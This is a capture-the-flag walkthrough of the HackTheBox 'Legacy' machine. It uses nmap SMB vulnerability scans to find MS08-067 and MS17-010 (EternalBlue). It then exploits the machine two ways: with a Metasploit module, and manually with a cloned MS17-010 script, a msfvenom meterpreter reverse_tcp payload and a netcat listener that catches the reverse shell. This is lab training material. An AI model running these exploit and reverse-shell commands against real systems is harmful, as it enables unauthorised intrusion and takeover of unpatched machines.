# Legacy - HackTheBox

![legacy](https://coldfusionx.github.io/assets/img/Posts/Legacy.png)

### Enumeration

#### Nmap

```
nmap -Pn -T4 -sC -sV -p- 10.10.10.4

139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```

Ports 139 and 445 are the defaults ports for SMB protocol.

Let's run the nmap scripts to identify potential vulnerability :
```
nmap -Pn --script smb-vuln* 10.10.10.4

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

The Legacy machine seems to be running SMBv1, first version of the SMB protocol.

EternalBlue is an exploit exploiting this vulnerability.

### Metasploit

```
msf> use exploit/windows/smb/ms17_010_psexec
msf> set rhosts 10.10.10.4
msf> set lhost <local_ip>
msf> exploit
```

We have a meterpreter session opening and it looks like we are `Administrator`.

We can get the user flag in `C:\Documents and Settings\john\Desktop\user.txt`.

And for the root flag : `C:\Documents and Settings\Administrator\Desktop\root.txt`.

### Without Metasploit

Let's do some research on the EternalBlue exploit.

We find this link : https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/

We clone the Github repository :

```
git clone https://github.com/helviojunior/MS17-010
```

We generate a payload with `msfvenom` :

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=1234 -f exe > eternablue.exe
```

Start a netcat listener on the specified port :

```
nc -lnvp 1234
```

And run the script `send_and_execute.py` :

```
python send_and_execute.py 10.10.10.4 eternablue.exe
```

We've got a connection back and we can get user and root flags !
